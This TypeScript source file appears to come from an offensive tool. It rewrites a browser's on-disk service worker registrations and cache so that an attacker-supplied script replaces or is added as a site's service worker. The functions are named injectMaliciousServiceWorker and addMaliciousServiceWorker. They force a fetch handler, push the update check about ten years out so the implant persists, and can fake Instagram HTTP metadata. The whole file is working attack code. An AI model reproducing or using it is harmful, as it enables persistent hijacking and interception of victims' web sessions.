import { SwResourceManager, Streams } from "./diskCache"
import { SwRegistrationHandler } from "./levelDb/serviceWorkerLevelDb"
import * as fs from 'fs/promises'
import { windows10YearsFromNow } from "./utils"

export async function injectMaliciousServiceWorker(url: URL, targetServiceWorker: string, swResourceManager: SwResourceManager, swRegistrationHandler: SwRegistrationHandler) {
    const registrations = await swRegistrationHandler.getRegistrations(url)
    for(let registration of registrations) {
        const newScriptUrl = registration.registration.value.getScriptUrl()!.replace(/\/[^\/]+$/, "/invalid.js")
        registration.registration.value.setScriptUrl(newScriptUrl)
        registration.registration.value.setHasFetchHandler(true)

        // Sets expiration time about 10 years out from the current time
        registration.registration.value.setLastUpdateCheckTime(windows10YearsFromNow)

        console.log("Post modified registration:\n", registration.registration.value.toObject())

        for(let {value: resourceRecord} of registration.resourceRecords) {
            resourceRecord.setUrl(newScriptUrl)
            console.log("Post modified resource:\n", resourceRecord.toObject())
            const diskCacheKey = `${resourceRecord.getResourceId()}`
            const serviceWorkerContent =  await swResourceManager.get(diskCacheKey, Streams.ServiceWorkerScriptContent)
            serviceWorkerContent.body.value = targetServiceWorker
            await serviceWorkerContent.save()

            try {
                await swResourceManager.remove(diskCacheKey, Streams.ServiceWorkerMetadata)
            } catch(e) {
                console.error("Failed to remove service worker metadata file. This is not always indicative of an error")
            }
        }

        await swRegistrationHandler.saveRegistrationEntries(registration.registration, ...registration.resourceRecords)
    }
}

export async function addMaliciousServiceWorker(url : URL, targetServiceWorker: string, swResourceManager: SwResourceManager, swRegistrationHandler: SwRegistrationHandler) {
    const resourceId = await swRegistrationHandler.addRegistration(url)
    const dummyHttpInfo = await fs.readFile("static/dummyInstagramHttpInfo")
    await swResourceManager.writeResourceFile(`${resourceId}`, Buffer.from(targetServiceWorker), dummyHttpInfo)
}
